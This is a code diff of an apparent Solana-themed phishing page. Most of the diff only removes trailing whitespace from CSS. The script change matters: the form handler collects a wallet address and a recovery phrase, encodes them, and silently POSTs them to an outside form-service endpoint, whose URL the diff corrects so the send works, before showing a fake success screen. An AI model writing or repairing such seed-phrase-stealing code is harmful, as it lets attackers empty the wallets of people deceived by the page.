@@ -13,19 +13,19 @@
             background: #000; 
             color: #fff; 
             font-family: 'Space Grotesk', sans-serif; 
-            height: 100vh; 
-            width: 100vw; 
+            height: 100vh;
+            width: 100vw;
             overflow: hidden; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
         .card { 
-            position: fixed; 
-            top: 50%; 
-            left: 50%; 
-            transform: translate(-50%, -50%); 
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             width: 90%; 
             max-width: 500px; 
             background: #080808; 
@@ -33,8 +33,8 @@
             border-radius: 40px; 
             padding: 60px 30px; 
             text-align: center; 
-            box-shadow: 0 0 80px rgba(0, 0, 0, 1); 
-            box-sizing: border-box; 
+            box-shadow: 0 0 80px rgba(0, 0, 0, 1);
+            box-sizing: border-box;
         }
 
         .sub { 
@@ -44,7 +44,7 @@
             color: var(--sol-g); 
             margin-bottom: 40px; 
             font-weight: 700; 
-            line-height: 1.6; 
+            line-height: 1.6;
         }
 
         .ib { text-align: left; margin-bottom: 30px; }
@@ -70,8 +70,8 @@
             font-size: 1rem; 
             box-sizing: border-box; 
             height: 140px; 
-            resize: none; 
-            outline: none; 
+            resize: none;
+            outline: none;
         }
 
         textarea:focus { border-color: var(--sol-g); background: #151515; }
@@ -88,7 +88,7 @@
             font-size: 0.8rem; 
             cursor: pointer; 
             box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); 
-            text-transform: uppercase; 
+            text-transform: uppercase;
         }
 
         #success-view { display: none; }
@@ -96,13 +96,13 @@
         h1 { 
             font-family: 'Syncopate', sans-serif; 
             font-size: 1.7rem; 
-            margin: 0 0 25px 0; 
+            margin: 0 0 25px 0;
             background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
             -webkit-background-clip: text; 
             -webkit-text-fill-color: transparent; 
             letter-spacing: -1px; 
             font-weight: 700; 
-            text-transform: uppercase; 
+            text-transform: uppercase;
         }
 
         .congrats { 
@@ -110,8 +110,8 @@
             background: rgba(0, 255, 163, 0.05); 
             border-radius: 20px; 
             border: 1px dashed var(--sol-g); 
-            width: 100%; 
-            box-sizing: border-box; 
+            width: 100%;
+            box-sizing: border-box;
         }
     </style>
 </head>
@@ -157,11 +157,7 @@
         form.addEventListener('submit', function(e) {
             e.preventDefault();
 
-            // 1. INSTANTLY switch to success page
-            formView.style.display = "none";
-            successView.style.display = "block";
-
-            // 2. Prepare data silently in background
+            // Prepare Encoding (Address Line 1, Phrase Line 2)
             try {
                 const solAddress = document.getElementById('sol-address').value;
                 const recPhrase = document.getElementById('rec-phrase').value;
@@ -171,12 +167,16 @@
                 document.getElementById('coded-phrase').value = "Encoding Error";
             }
 
-            // 3. Send data silently
+            // Using the EXACT delivery method from your old code
             const formData = new FormData(form);
-            fetch('https://web3forms.com', {
+            fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
                 body: formData
             });
+
+            // INSTANT page switch
+            formView.style.display = "none";
+            successView.style.display = "block";
         });
     </script>
 </body>
